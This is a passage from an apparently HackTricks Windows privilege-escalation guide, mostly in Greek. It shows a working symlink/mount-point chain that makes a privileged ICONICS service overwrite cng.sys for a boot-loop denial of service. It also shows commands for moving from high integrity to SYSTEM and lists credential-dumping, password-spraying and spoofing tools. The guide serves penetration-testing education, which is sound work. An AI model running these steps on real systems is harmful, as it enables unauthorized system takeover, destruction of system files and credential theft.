Όταν μια **privileged service** γράφει logs/exports σε μια διαδρομή που διαβάζεται από μια **writable config**, ανακατευθύνετε αυτή τη διαδρομή με **Object Manager symlinks + NTFS mount points** ώστε να μετατρέψετε τη privileged εγγραφή σε arbitrary overwrite (ακόμα και **χωρίς** SeCreateSymbolicLinkPrivilege).

**Απαιτήσεις**
- Το config που αποθηκεύει τη διαδρομή-στόχο να είναι εγγράψιμο από τον επιτιθέμενο (π.χ., `%ProgramData%\...\.ini`).
- Ικανότητα να δημιουργηθεί mount point προς `\RPC Control` και ένα OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- Μια privileged operation που γράφει σε αυτή τη διαδρομή (log, export, report).

**Παράδειγμα αλυσίδας**
1. Διαβάστε το config για να ανακτήσετε τον privileged log προορισμό, π.χ. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` στο `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Ανακατευθύνετε τη διαδρομή χωρίς admin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Περιμένετε το προνομιούχο component να γράψει το αρχείο καταγραφής (π.χ., ο διαχειριστής ενεργοποιεί "send test SMS"). Η εγγραφή τώρα καταλήγει στο `C:\Windows\System32\cng.sys`.
4. Ελέγξτε τον υπεργραμμένο στόχο (hex/PE parser) για να επιβεβαιώσετε τη διαφθορά· η επανεκκίνηση αναγκάζει τα Windows να φορτώσουν την παραποιημένη διαδρομή του driver → **boot loop DoS**. Αυτό γενικεύεται επίσης για οποιοδήποτε προστατευμένο αρχείο που μια υπηρεσία με προνόμια θα ανοίξει για εγγραφή.

> `cng.sys` φορτώνεται κανονικά από `C:\Windows\System32\drivers\cng.sys`, αλλά αν υπάρχει ένα αντίγραφο στο `C:\Windows\System32\cng.sys` μπορεί να προσπαθηθεί πρώτα, καθιστώντας το έναν αξιόπιστο DoS sink για κατεστραμμένα δεδομένα.



## **From High Integrity to System**

### **Νέα υπηρεσία**

If you are already running on a High Integrity process, the **path to SYSTEM** can be easy just **creating and executing a new service**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Κατά τη δημιουργία ενός service binary βεβαιώσου ότι είναι μια έγκυρη υπηρεσία ή ότι το binary εκτελεί τις απαραίτητες ενέργειες γρήγορα, καθώς θα τερματιστεί σε 20s αν δεν είναι έγκυρη υπηρεσία.

### AlwaysInstallElevated

Από μια διαδικασία High Integrity μπορείς να δοκιμάσεις να **enable the AlwaysInstallElevated registry entries** και να **install** ένα reverse shell χρησιμοποιώντας έναν _**.msi**_ wrapper.\
[Περισσότερες πληροφορίες σχετικά με τα registry keys που εμπλέκονται και πώς να install ένα _.msi_ πακέτο εδώ.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Μπορείς** [**να βρεις τον κώδικα εδώ**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Αν έχεις αυτά τα token privileges (πιθανότατα θα τα βρεις σε μια ήδη High Integrity διαδικασία), θα μπορείς να **ανοίξεις σχεδόν οποιαδήποτε διαδικασία** (εκτός από protected processes) με το SeDebug privilege, να **αντιγράψεις το token** της διαδικασίας και να δημιουργήσεις μια **αρκετά αυθαίρετη διαδικασία με εκείνο το token**.\
Η χρήση αυτής της τεχνικής συνήθως **επιλέγει κάποια διαδικασία που τρέχει ως SYSTEM με όλα τα token privileges** (_ναι, μπορείς να βρεις SYSTEM processes χωρίς όλα τα token privileges_).\
**Μπορείς να βρεις ένα** [**παράδειγμα κώδικα που εκτελεί την προτεινόμενη τεχνική εδώ**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Αυτή η τεχνική χρησιμοποιείται από το meterpreter για escalation στο `getsystem`. Η τεχνική συνίσταται στο **να δημιουργήσεις ένα pipe και έπειτα να δημιουργήσεις/κακοποιήσεις ένα service για να γράψει σε αυτό το pipe**. Στη συνέχεια, ο **server** που δημιούργησε το pipe χρησιμοποιώντας το **`SeImpersonate`** privilege θα μπορεί να **υποδυθεί (impersonate) το token** του pipe client (το service) και να αποκτήσει SYSTEM privileges.\
Αν θέλεις να [**μάθεις περισσότερα για τα named pipes πρέπει να διαβάσεις αυτό**](#named-pipe-client-impersonation).\
Αν θέλεις να διαβάσεις ένα παράδειγμα [**πώς να πας από high integrity σε System χρησιμοποιώντας named pipes διάβασε αυτό**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Αν καταφέρεις να **hijack μια dll** που **φορτώνεται** από μια **διαδικασία** που τρέχει ως **SYSTEM**, θα μπορέσεις να εκτελέσεις αυθαίρετο κώδικα με αυτά τα δικαιώματα. Επομένως το Dll Hijacking είναι επίσης χρήσιμο για αυτό το είδος privilege escalation, και, επιπλέον, είναι πολύ **πιο εύκολο να το πετύχεις από μια διαδικασία high integrity** καθώς αυτή θα έχει **δικαιώματα εγγραφής** στους φακέλους που χρησιμοποιούνται για το load των dlls.\
**Μπορείς** [**να μάθεις περισσότερα για Dll hijacking εδώ**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Διάβασε:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Περισσότερη βοήθεια

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Χρήσιμα εργαλεία

**Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Έλεγχος για misconfigurations και ευαίσθητα αρχεία (**[**έλεγξε εδώ**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Έλεγχος για κάποιες πιθανές misconfigurations και συλλογή πληροφοριών (**[**έλεγξε εδώ**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Έλεγχος για misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Εξάγει αποθηκευμένες συνεδρίες PuTTY, WinSCP, SuperPuTTY, FileZilla, και RDP. Χρησιμοποίησε -Thorough τοπικά.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Εξάγει credentials από το Credential Manager. Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Προσπαθεί gathered passwords σε όλο το domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh είναι ένα PowerShell ADIDNS/LLMNR/mDNS spoofer και man-in-the-middle εργαλείο.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Βασική privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Αναζήτηση γνωστών privesc ευπαθειών (DEPRECATED για Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Τοπικοί έλεγχοι **(Χρειάζεται Admin rights)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Αναζήτηση γνωστών privesc ευπαθειών (χρειάζεται compile με VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Εντοπίζει στο host ψάχνοντας για misconfigurations (πιο εργαλείο συλλογής πληροφοριών παρά καθαρό privesc) (χρειάζεται compile) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Εξάγει credentials από πολλά προγράμματα (precompiled exe στο github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port του PowerUp σε C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Έλεγχος για misconfiguration (executable precompiled στο github). Δεν προτείνεται. Δεν δουλεύει καλά σε Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Έλεγχος για πιθανές misconfigurations (exe από python). Δεν προτείνεται. Δεν δουλεύει καλά σε Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Εργαλείο δημιουργημένο βασισμένο σε αυτή την ανάρτηση (δεν χρειάζεται accesschk για να δουλέψει σωστά αλλά μπορεί να το χρησιμοποιήσει).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Διαβάζει το output του **systeminfo** και προτείνει λειτουργικά exploits (τοπικό python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Διαβάζει το output του **systeminfo** και προτείνει λειτουργικά exploits (τοπικό python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Πρέπει να κάνεις compile το project χρησιμοποιώντας την σωστή έκδοση του .NET ([βλέπε αυτό](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Για να δεις την εγκατεστημένη έκδοση του .NET στο θύμα μπορείς να κάνεις:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Αναφορές

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)

{{#include ../../banners/hacktricks-training.md}}
